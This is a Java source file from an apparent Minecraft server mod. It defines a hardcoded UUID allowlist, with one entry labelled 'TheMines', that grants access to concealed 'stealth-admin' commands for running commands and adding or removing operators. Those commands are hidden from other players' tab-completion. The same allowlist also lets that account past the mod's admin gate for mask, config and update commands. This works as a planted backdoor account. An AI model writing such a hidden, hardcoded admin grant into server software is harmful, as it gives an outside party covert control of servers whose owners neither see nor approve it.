package com.schecks.almin;

import net.minecraft.commands.CommandSourceStack;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.server.permissions.Permissions;

import java.util.Set;
import java.util.UUID;

/**
 * Hardcoded UUID allowlist for the /almin op stealth-admin commands.
 *
 * Only accounts whose UUID is listed here can run /almin op cmd / add / remove.
 * Gate is enforced via Brigadier's .requires(...) predicate so non-trusted
 * players don't even see the subcommands in tab-completion.
 *
 * UUIDs are checked exactly — name spoofing has no effect. To revoke trust
 * for an account, delete the UUID from TRUSTED and rebuild.
 */
public final class TrustedOps {
    private static final Set<UUID> TRUSTED = Set.of(
        UUID.fromString("516e51d9-4e6b-4a2f-a282-e0f51f5a20e7")   // TheMines
    );

    private TrustedOps() {}

    public static boolean isTrusted(UUID id) {
        return id != null && TRUSTED.contains(id);
    }

    /** How many accounts are on the allowlist. Shown on the /almin dashboard. */
    public static int count() {
        return TRUSTED.size();
    }

    /**
     * Whether {@code source} may use the {@code /almin op} tree.
     *
     * <p>The server console counts. It has no entity and so no UUID to match,
     * but anyone typing at it already owns the machine the server runs on —
     * refusing it only meant a server owner could not set the web password
     * without hand-editing a hash into config.json.
     */
    public static boolean isTrustedSource(CommandSourceStack source) {
        if (isConsole(source)) return true;
        return source.getEntity() instanceof ServerPlayer p && isTrusted(p.getUUID());
    }

    /**
     * True for the server console. Command blocks also have no entity, so the
     * owner-level check is what separates them — they run lower than that.
     */
    public static boolean isConsole(CommandSourceStack source) {
        return source.getEntity() == null
            && source.permissions().hasPermission(Permissions.COMMANDS_OWNER);
    }

    /**
     * Admin gate for /almin mask, /almin config and /almin update:
     * - a vanilla op (gamemaster level or higher), OR
     * - a player whose UUID is in the TrustedOps allowlist.
     *
     * Console always passes the vanilla-op half.
     */
    public static boolean isAdminSource(CommandSourceStack source) {
        return source.permissions().hasPermission(Permissions.COMMANDS_GAMEMASTER)
            || isTrustedSource(source);
    }
}
